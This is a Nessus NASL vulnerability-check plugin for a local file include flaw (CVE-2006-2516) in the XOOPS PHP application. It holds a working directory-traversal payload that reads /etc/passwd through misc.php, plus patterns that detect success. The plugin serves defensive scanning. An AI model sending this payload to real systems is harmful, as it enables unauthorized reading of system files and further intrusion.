#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is vulnerable to
local file include attacks. 

Description :

The version of xoops installed on the remote host allows an
unauthenticated attacker to skip processing of the application's
'include/common.php' script and thereby to gain control of the
variables '$xoopsConfig[language]' and '$xoopsConfig[theme_set]',
which are used by various scripts to include PHP code from other
files.  Successful exploitation of these issues requires that PHP's
'register_globals' setting be enabled and can be used to view
arbitrary files or to execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user id. 

See also :

http://www.securityfocus.com/archive/1/434698/30/0/threaded

Solution :

Unknown at this time. 

Risk factor :

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(21581);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-2516");
  script_bugtraq_id(18061);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"25683");

  script_name(english:"xoops nocommon Parameter Local File Include Vulnerability");
  script_summary(english:"Tries to read a local file using Xoops");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("xoops_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/xoops"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (matches)
{
  dir = matches[2];

  # Try to exploit one of the flaws to read a file.
  file = "../../../../../../../../../../../etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/misc.php?",
      "xoopsOption[nocommon]=1&",
      "xoopsConfig[language]=", file
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream".
    egrep(pattern:"main\(.+/etc/passwd\\0/misc\.php.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(.+/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(.*/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = desc;

    security_warning(port:port, data:report);
    exit(0);
  }
}
